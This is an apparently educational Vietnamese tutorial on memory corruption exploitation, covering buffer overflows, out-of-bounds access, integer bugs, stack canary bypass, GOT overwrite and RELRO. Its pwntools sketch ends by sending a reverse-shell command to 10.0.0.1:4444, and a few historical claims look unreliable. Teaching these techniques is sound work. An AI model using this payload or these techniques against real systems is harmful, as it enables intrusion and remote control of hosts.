# Memory Corruption Resources: Từ Bản Chất Đến Nghệ Thuật Khai Thác

---

## Phần 1: Lỗi Bộ Nhớ - Nền Tảng Của Mọi Cuộc Tấn Công

> *Đoạn lịch sử này giúp hiểu tại sao C/C++ lại "nguy hiểm", bạn có thể lướt qua luôn cũng được.*

<details>
    <summary>Lịch sử & Di sản của C/C++</summary>

### 1. "Sức Mạnh Đi Kèm Trách Nhiệm Lớn"
Năm 1972, Dennis Ritchie tạo ra ngôn ngữ C với mục tiêu: Tính di động (Portability) và Kiểm soát cấp thấp (Low-level Control). C được thiết kế để ánh xạ gần như trực tiếp xuống Assembly, không có tầng trừu tượng hay cơ chế an toàn "bất ngờ" nào. Điều này mang lại hiệu năng vô song, nhưng trao toàn bộ trách nhiệm quản lý bộ nhớ cho lập trình viên. Bất kỳ sai sót nào cũng sẽ trở thành một cánh cửa cho kẻ tấn công.

### 2. Di Sản Không An Toàn
Dù các ngôn ngữ an toàn bộ nhớ như Rust đã ra đời, một lượng khổng lồ phần mềm cốt lõi (Windows, Linux, trình duyệt, máy chủ web) đều được xây dựng bằng C/C++. Các lỗ hổng bộ nhớ không phải là vấn đề của quá khứ, chúng **đang được tạo ra mỗi ngày** trong các phần mềm mới.

### 3. Hạt Mầm Của Lỗ Hổng
Năm 1968, Robert Graham từng đặt câu hỏi: *"Điều gì sẽ xảy ra nếu một chương trình cho phép ai đó ghi đè lên vùng nhớ mà họ không được phép?"*
Đối với một hacker, câu trả lời là: *"Bạn có thể chiếm quyền điều khiển chương trình đó"*. Lỗi ghi đè bộ nhớ (Memory Corruption) là gốc rễ của phần lớn các cuộc tấn công mạng nghiêm trọng nhất lịch sử.
</details>

---

## Phần 2: Cội Nguồn Của Sự Sụp Đổ - Phân Tích Logic Gây Lỗi

Trước khi khai thác, ta cần hiểu điều gì đã tạo ra lỗ hổng. Dưới đây là các tác nhân cốt lõi gây ra Memory Corruption.

### 2.1. Classic Buffer Overflow & Kích Thước Ảo Ảnh
Lỗi cơ bản nhất xuất phát từ việc C không tự động theo dõi kích thước mảng.
```c
char small_buffer[16];
read(0, small_buffer, 128); // read() không hề biết mảng chỉ chứa được 16 bytes
```
Tuy nhiên, trên kiến trúc x64, mọi thứ không chỉ là đếm byte. Do yêu cầu **Data Alignment (Căn chỉnh dữ liệu)**, trình biên dịch thường thêm các byte đệm (padding) vào giữa các biến. Một lỗi overflow nhỏ (vài byte) có thể không chạm tới `Return Address`, nhưng nó âm thầm đè vào padding và tràn sang các biến cục bộ liền kề (VD: cờ boolean phân quyền `isAdmin`). Kiểm soát các biến này bằng một overflow "nửa vời" là chìa khóa leo thang đặc quyền mà không làm crash chương trình.

---

### 2.2. Sự Tin Tưởng Mù Quáng (Vấn Đề Truy Cập Vượt Biên - Out-of-Bounds)

#### OOB READ (Rò Rỉ Thông Tin - Info Leak)
OOB Read là tiền đề của mọi cuộc tấn công hiện đại để vượt mặt không gian bộ nhớ ngẫu nhiên (ASLR).
```c
long secret_key = 0xdeadbeefcafebabe; 
long public_data[5] = {1, 2, 3, 4, 5};
int index;
scanf("%d", &index); 
// LỖI: Không kiểm tra biên. Nếu index = 5 hoặc 6, ta sẽ đọc được secret_key.
printf("Data: 0x%lx\n", public_data[index]);
```

#### OOB WRITE (Thao Túng Dữ Liệu)
OOB Write cho phép bạn thay đổi những thứ lẽ ra không được phép thay đổi.
```c
struct User {
    long id_list[2];
    int is_admin; // 0: User, 1: Admin
};
struct User user1; user1.is_admin = 0;
// LỖI: Không kiểm tra index [0, 1]. Nếu nhập index = 2, new_id sẽ ghi đè thẳng vào is_admin.
user1.id_list[index] = new_id; 
```

---

### 2.3. Lỗi Toán Học (Arithmetic Primitives)

Những lỗ hổng này rất tinh vi, biến một code nhìn bề ngoài an toàn thành thảm họa.

#### A. Signedness Bug (Lỗi nhầm lẫn Dấu)
Xảy ra khi dùng số có dấu (`int`) để kiểm tra biên, nhưng lại dùng làm số không dấu (`size_t`) khi thao tác.
```c
int size; // Số có dấu (32-bit)

scanf("%d", &size);

if (size > 32) return; // Kẻ tấn công nhập -1 để lách điều kiện này

read(0, buffer, size); // read nhận size_t. -1 bị ép kiểu thành 0xffffffffffffffff
```

Mấu chốt của vấn đề là biến `size` được khai báo như kiểu `int`, nhưng hàm `read()` mong đợi kiểu `size_t` - số không dấu. Vậy, khi hàm `read()` sử dụng biến `size` sẽ ép nó về kiểu số không dấu (`0xfffff...`) theo quy tắc **Số bù hai (Two's Compliment)**

> Để biết cụ thể một hàm mong đợi kiểu dữ liệu gì, hãy google bằng cách gõ `man + <tên hàm>`

**Chú ý:** Độ lớn của `size_t` không cố định
* Trên hệ điều hành 32-bit: size_t thường dài 4 byte (giống như unsigned int).
* Trên hệ điều hành 64-bit: size_t dài 8 byte (giống như unsigned long long).
* `size_t` được thiết kế để có thể chứa được kích thước lớn nhất của một mảng mà bộ nhớ máy tính đó có thể cấp phát được.

#### B. Integer Overflow (Tràn số nguyên)
Xảy ra khi một phép tính vượt quá giới hạn và "quay vòng" về giá trị nhỏ.
```c
unsigned short count;
scanf("%hu", &count); // Nhập 8193
size_t total_size = count * 8; // 8193 * 8 = 65544. Nếu bị ép về 16-bit, 65544 % 65536 = 8.
long *items = malloc(total_size); // Chỉ cấp phát 8 bytes!
for (int i=0; i<count; i++) scanf("%ld", &items[i]); // Vòng lặp 8193 lần -> Tràn Heap nát bét!
```

#### C. Integer Truncation (Cắt cụt)
Xảy ra khi ép kiểu từ biến lớn (64-bit) xuống biến nhỏ (16-bit), làm mất bit cao.
```c
unsigned long long big_size = 65537; // 0x10001
unsigned short small_size = (unsigned short)big_size; // Bị cắt còn 0x0001 (tức là 1)
if (small_size < 100) memcpy(buf, "A", big_size); // Bị lách kiểm tra, copy 65537 bytes!
```

---

### 2.4. Khắc Tinh Của Việc Kiểm Tra Biên (Bounds Check Elimination)

| Loại lỗi | Đặc điểm & Cơ chế |
| :--- | :--- |
| **Missing Lower Bound** | Lập trình viên chỉ check `index >= max` mà quên check `index < 0`. Lợi dụng index âm, ta có thể OOB ngược lên trên Stack để đè các con trỏ quan trọng. |
| **Logic Mismatch** | Lệnh `if (len > max)` có cảnh báo lỗi ra màn hình nhưng lại... quên lệnh `return` hoặc `exit`, khiến luồng code bên dưới vẫn chạy bình thường. |
| **TOCTOU (Race Condition)** | Kẻ tấn công dùng Đa luồng: Đợi Thread A vượt qua lệnh `if (index < max)`, Thread B lập tức sửa đổi `index = 9999` trong RAM trước khi Thread A dùng đến nó. |
| **Compiler BCE** | Trình biên dịch "tự ý" xóa bỏ lệnh `if` kiểm tra biên vì nó phân tích logic tĩnh và cho rằng lệnh đó thừa. Code C an toàn nhưng Binary lại thủng. |

---

## Phần 3: Nghệ Thuật Khai Thác Trên Ngăn Xếp (Smashing the Stack)

Khi đã có khả năng ghi đè bộ nhớ, mục tiêu kinh điển nhất luôn là **Ngăn Xếp (Stack)** - nơi trộn lẫn giữa Dữ liệu (Data) và Luồng điều khiển (Control Flow).

### 3.1. Phân tích hiện trường: Stack x64 & Nút thắt `RIP`
Trên x64 Linux, Stack phát triển về phía **địa chỉ thấp**, nhưng các hàm ghi bộ nhớ (`read`, `gets`) lại ghi từ dưới lên **địa chỉ cao**. Mọi dữ liệu bị tràn sẽ tiến thẳng tới các cấu trúc điều khiển.

```text
[Địa chỉ Cao]
+--------------------------------+
| Return Address (RIP) (8 bytes) | <--- Nơi CPU nhảy về sau khi hàm kết thúc. (MỤC TIÊU TỐI THƯỢNG)
+--------------------------------+
| Saved RBP (8 bytes)            | <--- Base pointer của hàm cha.
+--------------------------------+
| Biến cục bộ (Cờ, size...)      | <--- Dữ liệu Non-control.
+--------------------------------+
| Local Buffer (Mảng của bạn)    | <--- NƠI BẮT ĐẦU GHI (Tràn lên trên).
+--------------------------------+
[Địa chỉ Thấp]
```

Lệnh **`ret`** ở cuối mỗi hàm thực chất là lệnh lấy giá trị tại `Return Address` đưa vào thanh ghi `RIP`. Bằng cách tràn buffer và ghi đè giá trị này, chuỗi lệnh `ret` trở thành bệ phóng đưa CPU chạy theo hướng ta muốn.
**Payload kinh điển:** `[Junk Data lấp đầy Buffer] +[8 bytes rác đè Saved RBP] + [Địa chỉ Target đè Return Address]`

### 3.2. Các cấp độ thao túng lệnh `ret`
1. **Ret2Win:** Nếu chương trình có sẵn hàm "tặng điểm" (VD: `system("/bin/sh")`), ta chỉ cần đè Return Address trỏ về đó.
2. **Ret2Shellcode:** Nếu Stack có quyền Thực thi (thiếu bảo vệ NX), ta chèn mã máy (Shellcode) vào Buffer, rồi đè Return Address trỏ ngược lại đúng địa chỉ của Buffer.
3. **ROP (Return-Oriented Programming):** Khi Stack bị khóa quyền thực thi (NX enabled), ta tìm các mẩu code có sẵn trong bộ nhớ (Gadget kết thúc bằng `ret`) và xâu chuỗi chúng lại trên Stack để gọi các hàm hệ thống.

---

## Phần 4: Lớp Phòng Thủ Báo Động & Nghệ Thuật Info Leak

Để đối phó với Stack Smashing, trình biên dịch sinh ra **Stack Canary** - Một giá trị ngẫu nhiên 8-byte đặt giữa biến cục bộ và `Saved RBP`. Nếu đè tràn qua nó, Canary bị thay đổi, chương trình sẽ báo động và Crash ngay lập tức. Cánh cửa Exploit giờ đây phụ thuộc vào việc **Rò rỉ dữ liệu (Info Leak)**.

### 4.1. Các kỹ thuật rò rỉ dữ liệu (Information Disclosure)

* **Thiếu Null-Byte (Overread):** Chuỗi C kết thúc bằng `\0`. Nhờ Little Endian, byte `\0` của Canary nằm sát buffer. Nếu nhập chuỗi vừa khít chạm Canary và đè byte `\0` thành ký tự khác, hàm `puts(buffer)` sẽ trôi lố qua biên và in luôn 7 byte Canary ẩn giấu ra màn hình.
* **Buffer Overread:** Nếu hàm `write(1, buffer, size)` bị ép đọc với `size` cực lớn, toàn bộ cấu trúc Stack (Canary, `Saved RBP`, `Return Address`) sẽ bị phơi bày. Từ đây ta Bypass luôn cả cơ chế ASLR và PIE.
* **Dữ liệu chưa khởi tạo (Uninitialized Data):** C không tự dọn rác. Nếu một biến nội bộ được khai báo mà không khởi tạo giá trị, nó sẽ "ôm trọn" dữ liệu nhạy cảm từ các hàm chạy trước đó. Chương trình in biến này ra đồng nghĩa với Info Leak miễn phí.

### 4.2. Các phương pháp "Lách" qua Stack Canary
1. **Leak Canary:** Dùng Info Leak để lấy giá trị. Trong payload overflow, chỉ việc chèn lại đúng giá trị đó vào vị trí cũ rồi tiếp tục đè `RIP`.
2. **Byte-by-Byte Brute-Force:** Trong các server dùng `fork()`, tiến trình con thừa kế nguyên vẹn Canary từ cha. Đè sai 1 byte, con crash nhưng cha vẫn sống và đẻ ra con mới. Ta có thể brute-force từng byte một (mất tối đa 1792 lần thử trên x64).
3. **Nhảy cóc (Jumping Canary):** Nếu lỗi là vòng lặp OOB bằng index, ta có thể sửa biến index để nhảy qua vùng nhớ Canary, đè thẳng vào `Return Address` mà không chạm vào canary.

### 4.3. Kỹ nghệ Exploit (Exploit Engineering)
* **Cyclic Values (Mẫu chuỗi De Bruijn):** Thay vì gửi chuỗi `AAAA`, hãy gửi chuỗi tuần hoàn (`aaaaabaaacaaa...`). Khi GDB báo lỗi tại giá trị đặc biệt, ta tra ngược chuỗi để biết chính xác offset đè `RIP` đến từng byte.
* **Dynamic Analysis (GDB):** Biến môi trường lúc runtime sẽ làm xê dịch Stack. Việc tìm offset và địa chỉ phải luôn được đo bằng công cụ debug (GDB + GEF/pwndbg) trong lúc chương trình đang chạy.

---

## Phần 5: Cuộc Chiến Bảng Phân Giải - Chiếm Đoạt GOT

Nếu Stack bị bảo vệ quá nghiêm ngặt (Canary không thể leak), mục tiêu tối thượng chuyển sang **Bảng GOT (Global Offset Table)**.

---

### 1. TẠI SAO LẠI CẦN PLT VÀ GOT? (Sự ra đời của vấn đề)

Nói ngắn gọn: **Để tiết kiệm tài nguyên và thích ứng với ASLR.**

Nếu bạn biên dịch tĩnh (Static Linking), toàn bộ code của hàm `puts`, `printf` từ thư viện `libc` sẽ bị nhồi thẳng vào file thực thi của bạn. File sẽ phình to lên hàng Megabytes. 
Thay vào đó, Linux dùng **Liên kết động (Dynamic Linking)**. Các chương trình chỉ chứa một "lời hứa" rằng nó sẽ dùng hàm `puts`. Khi chạy, hệ điều hành sẽ load một bản copy duy nhất của thư viện `libc.so` vào RAM và cho tất cả các phần mềm dùng chung.

**Nhưng rắc rối là:** Do cơ chế bảo vệ ASLR (Address Space Layout Randomization), địa chỉ của thư viện `libc` trong RAM sẽ bị đổi chỗ ngẫu nhiên mỗi lần chương trình khởi động. Tại thời điểm biên dịch mã nguồn, file thực thi **không thể biết** hàm `puts` sẽ nằm ở đâu trong bộ nhớ.

Để giải bài toán "gọi một hàm mà không biết địa chỉ của nó", hệ điều hành sinh ra cặp bài trùng: **Bảng PLT** và **Bảng GOT**.

---

### 2. GIẢI PHẪU CẤU TRÚC: CHÚNG LÀ GÌ VÀ TRÔNG NHƯ THẾ NÀO?

Trong không gian bộ nhớ của một tiến trình (Process Memory), hệ thống dành ra các phân vùng (sections) đặc biệt cho tác vụ này.

Dưới đây là cấu trúc của file ELF

<img width="680" height="1135" alt="image" src="https://github.com/user-attachments/assets/a5edacfa-de32-4c51-9a51-63389f46c166" />

### A. Bảng PLT (Procedure Linkage Table)
*   **Bản chất:** Là một phân vùng chứa **Mã lệnh (Code)**. Nó nằm trong vùng nhớ `.plt` và có quyền **Thực thi (Executable)**.
*   **Chức năng:** Đóng vai trò là các "Trampoline" (Bàn đạp). File thực thi sẽ không gọi thẳng vào `libc`, mà gọi vào các đoạn code nhỏ trong PLT.
*   **Nó trông như thế nào?** Nó là một mảng các đoạn Assembly ngắn, mỗi đoạn tương ứng với một hàm (ví dụ: `puts@plt`, `printf@plt`).

### B. Bảng GOT (Global Offset Table)
*   **Bản chất:** Là một phân vùng chứa **Dữ liệu (Data)**. Nó là một mảng các con trỏ (Pointers) 8-byte trên x64.
*   **Phân loại nhỏ (Rất quan trọng trong 0-day):**
    *   `.got`: Chứa địa chỉ của các biến toàn cục (Global Variables).
    *   `.got.plt`: Chứa địa chỉ thực của các **Hàm** ngoại lai (Function Pointers). *(Trong giới Pwn, khi nói GOT Overwrite, 99% ta đang nói đến `.got.plt`)*.
*   **Quyền truy cập:** Vì địa chỉ thực chỉ được biết *sau khi* chương trình đã chạy, vùng nhớ `.got.plt` này **bắt buộc phải có quyền Ghi (Writable)** mặc định.

---

### 3. CƠ CHẾ LAZY BINDING: ĐIỆU NHẢY CỦA POINTERS (Phân tích Assembly x64)

Để tối ưu tốc độ khởi động, Linux áp dụng **Lazy Binding (Liên kết trễ)**: Hệ thống sẽ *không* đi tìm địa chỉ của toàn bộ hàng ngàn hàm trong `libc` ngay từ đầu. Hàm nào được gọi thì mới đi tìm hàm đó.

Hãy soi mã máy x64 khi chương trình của bạn gọi `puts("hello hackers");`. Dưới đây là 3 trạng thái cần chú ý:

#### Trạng thái 1: Lần gọi đầu tiên (Pre-Resolution)
Khi `main` gọi `puts`, lệnh Assembly thực tế là `call puts@plt`.

<img width="1204" height="629" alt="image" src="https://github.com/user-attachments/assets/bbd760ed-45e2-4b3c-bd2c-afdffa765ff8" />


```assembly
; Bên trong vùng nhớ .plt (Quyền: Thực thi)
0x555555555030 <puts@plt>:
  jmp QWORD PTR[rip+0x2fca]  ; 1. Đọc một địa chỉ từ bảng GOT và nhảy đến đó
  push 0x0                    ; 2. Đẩy "ID" (reloc_index) của hàm puts lên Stack
  jmp 0x555555555020          ; 3. Nhảy đến PLT[0] (Khu vực của Phù thủy)
```

<details>
    <summary>Giải thích vài điều</summary>

---

* Trong file ELF hiện đại, có hai phân đoạn: .got (dành cho biến toàn cục) và .got.plt (dành cho địa chỉ hàm). Khi nói về PLT, chúng ta đang nói đến .got.plt.
<img width="869" height="654" alt="image" src="https://github.com/user-attachments/assets/b9293c5a-fc17-4946-9d7e-0bcbec104a4e" />

* Compiler và Linker khi tạo ra file thực thi đã tính toán trước khoảng cách (**offset**) cố định giữa phân đoạn mã lệnh (`.plt`) và phân đoạn dữ liệu (`.got.plt`). Lệnh `jmp [rip + offset]` là một lệnh "Indirect Jump" dùng để nhảy tới địa chỉ trong phân đoạn `.got.plt` mà `rip+offset` trỏ tới.

* File thực thi của bạn có một danh sách các hàm cần tìm địa chỉ (như `puts`, `printf`, `scanf`). Danh sách này nằm trong một bảng gọi là Relocation Table (cụ thể là `.rela.plt`). Vậy, `reloc_index` chính là số thứ tự (hoặc offset) của dòng đó trong bảng Relocation.

---
    
</details>

Ở dòng (1), CPU nhìn vào vùng `.got.plt` để xem hàm `puts` nằm ở đâu.
Nhưng vì đây là lần gọi đầu tiên, bảng GOT chưa chứa địa chỉ thật. Trình biên dịch đã cố tình gài sẵn vào GOT một địa chỉ "ảo", trỏ **ngược lại** chính dòng lệnh (2) bên trong PLT.

```assembly
; Bên trong vùng nhớ .got.plt (Quyền: Đọc/Ghi)
0x555555558018 <puts@got.plt>: 0x555555555036  (Chính là địa chỉ của lệnh push 0x0)
```

Kết quả: Luồng thực thi bị dội ngược lại, thực hiện lệnh `push 0x0` (lưu ID của hàm `puts` để hệ thống biết đang cần tìm hàm nào), rồi nhảy thẳng vào `PLT[0]`.

<img width="1239" height="664" alt="image" src="https://github.com/user-attachments/assets/1f34a71b-e1e4-4d43-8f8c-6d6b1fc0d7d5" />


#### Trạng thái 2: "Phù thủy" giải quyết (The Resolver)
`PLT[0]` chứa một đoạn code đặc biệt gọi vào hàm `_dl_runtime_resolve` của hệ điều hành (Dynamic Linker). 
"Phù thủy" này sẽ thực hiện các việc sau:
1. Dựa vào `ID = 0x0` trên Stack, nó tra cứu bảng Symbol để biết phần mềm đang đòi hàm `puts`.
2. Nó lùng sục trong không gian bộ nhớ của `libc.so` xem `puts` đang nằm ở địa chỉ vật lý nào.
3. **[HÀNH ĐỘNG CỐT LÕI]:** Nó lấy địa chỉ thật (ví dụ: `0x7ffff7a91da0`) và **ghi đè** vào ô `puts@got.plt`.
4. Nhảy đến hàm `puts` thật và in ra chữ "Hello".

#### Trạng thái 3: Các lần gọi sau (Post-Resolution)
Những lần tiếp theo chương trình gọi `puts("Hi");`, CPU lại chui vào `puts@plt` và chạy lệnh dòng (1):

```assembly
0x555555555030 <puts@plt>:
  jmp QWORD PTR [rip+0x2fca]  ; Đọc địa chỉ từ GOT
```
Lúc này, ô nhớ trong GOT đã chứa địa chỉ thật:
```assembly
0x555555558018 <puts@got.plt>: 0x00007ffff7a91da0  (Địa chỉ trong libc.so)
```
CPU nhảy một phát sang `libc` luôn, vô cùng trơn tru, không cần đi qua "Phù thủy" nữa.

<img: ảnh minh họa trạng thái Post-Resolution: Lệnh jmp trong PLT trỏ vào bảng GOT, bảng GOT giờ đây trỏ thẳng một đường mũi tên dài sang vùng nhớ của thư viện Libc>

---

### 4. CƠ CHẾ LỢI DỤNG: GOT OVERWRITE (Chiếm quyền điều khiển)

#### Bản chất của lỗ hổng
Kiến trúc Lazy Binding phơi bày một điểm yếu chí mạng: Bảng `.got.plt` chứa các **con trỏ hàm (Function Pointers)** quyết định luồng thực thi, nhưng lại nằm trong vùng nhớ **có quyền Ghi (Writable)** ở địa chỉ cố định (nếu không có PIE) hoặc địa chỉ tính toán được bằng Offset.

Chỉ cần kẻ tấn công sở hữu một **Arbitrary Write Primitive** (Lỗi ghi bộ nhớ tùy ý tại một địa chỉ bất kỳ, thường sinh ra từ Format String `%n`, OOB Write tĩnh, hoặc Use-After-Free), chúng sẽ biến GOT thành bàn đạp để Hijack luồng điều khiển.

#### Kịch bản khai thác kinh điển:
Kẻ tấn công nhận thấy chương trình có gọi hàm `exit()` ở cuối cùng.
1. **Dùng Arbitrary Write:** Kẻ tấn công ghi đè giá trị tại địa chỉ `exit@got.plt`.
2. **Nội dung ghi đè:** Thay vì để nó chứa địa chỉ của hàm `exit` (hoặc địa chỉ trỏ về PLT), kẻ tấn công ghi đè bằng địa chỉ của hàm **`system`** (hoặc địa chỉ của một đoạn ROP chain/Shellcode).
3. **Triggers (Kích hoạt):** Khi chương trình chạy đến cuối và gọi lệnh `exit()`, CPU làm đúng bổn phận: Nó tra cứu `exit@got.plt`, thấy địa chỉ của `system`, và nhảy thẳng vào `system`. 
4. Nếu kẻ tấn công khéo léo chuẩn bị sẵn thanh ghi `RDI` trỏ vào chuỗi `"/bin/sh"`, hàm `system("/bin/sh")` sẽ được gọi thay vì `exit()`.

### Minh họa Exploit giả mã (Python / Pwntools)
```python
from pwn import *

elf = ELF('./target_binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 1. Thu thập địa chỉ
got_puts_addr = elf.got['puts']  # Địa chỉ của ô puts@got.plt
system_addr = libc.symbols['system'] # Địa chỉ thật của system (Đã leak base trước đó)

# 2. Xây dựng Arbitrary Write
# Giả sử chúng ta có hàm write_memory(địa_chỉ, dữ_liệu) thông qua lỗi OOB Write
log.info(f"Overwriting puts@GOT ({hex(got_puts_addr)}) with system ({hex(system_addr)})")

write_memory(address=got_puts_addr, data=system_addr)

# 3. Kích hoạt (Trigger)
# Lần tiếp theo chương trình gọi puts("chuỗi của bạn"), 
# nó sẽ thực thi system("chuỗi của bạn")
send_payload("bash -c 'sh -i >& /dev/tcp/10.0.0.1/4444 0>&1'")
```

--- 
*Đây là toàn bộ giải phẫu học của GOT. Bạn có thể sử dụng các thẻ `<img: ...>` để bổ sung hình ảnh sơ đồ vào đúng các vị trí đã đánh dấu để tạo ra một bản tài liệu hoàn hảo về mặt thị giác.*
### 5. Phòng thủ bằng RELRO (Relocation Read-Only)
* **Partial RELRO:** Bảng `.got.plt` vẫn cho phép ghi. KHÔNG cản được GOT Overwrite.
* **Full RELRO:** Khi chương trình khởi động, Loader sẽ phân giải sẵn TẤT CẢ các hàm, điền vào GOT, rồi dùng syscall `mprotect` khóa cứng vùng nhớ GOT thành **Chỉ Đọc (Read-Only)**. GOT Overwrite chết đứng. Hacker lúc này phải nhắm vào các mục tiêu khó hơn như `__free_hook`, `__malloc_hook` của libc, cấu trúc luồng của tcache, hoặc vtable của C++ Heap Objects.

---

## Phần 6: Tư Duy Pwn - Chiến Thuật Phối Hợp Tổng Thể

Trong khai thác thực tế, OOB hay Buffer Overflow chỉ là "công cụ". Kẻ tấn công giỏi là người biết xâu chuỗi chúng thành một quy trình (Exploit Chain):

1. **Rò rỉ thông tin (Info Leak):** Dùng OOB Read / Format String để phá vỡ lớp mù lòa (ASLR, PIE, Canary).
2. **Sắp đặt trận địa bộ nhớ (Memory Orchestration / Heap Feng Shui):** Nếu lỗ hổng nằm trên Heap (vùng nhớ động), ta phải dùng các lệnh `malloc`/`free` để điều hướng bộ nhớ, ép "Mục tiêu" phải nằm sát cạnh "Buffer vũ khí".
3. **Leo thang năng lực (Primitive Escalation):** Biến một lỗi OOB yếu (như Off-by-one, ghi 1 byte Null) ghi đè vào biến `length` của một cấu trúc khác, từ đó tạo ra vũ khí OOB thứ hai mạnh mẽ hơn (Ghi tràn bộ nhớ tùy ý).
4. **Chiếm đoạt Control Flow (Control Flow Hijack):** Tung đòn quyết định. Dùng Arbitrary Write / OOB Write để đè `Return Address`, `GOT`, hoặc `vtable`, ép luồng thực thi đi theo kịch bản đã định (Ret2libc, ROP).
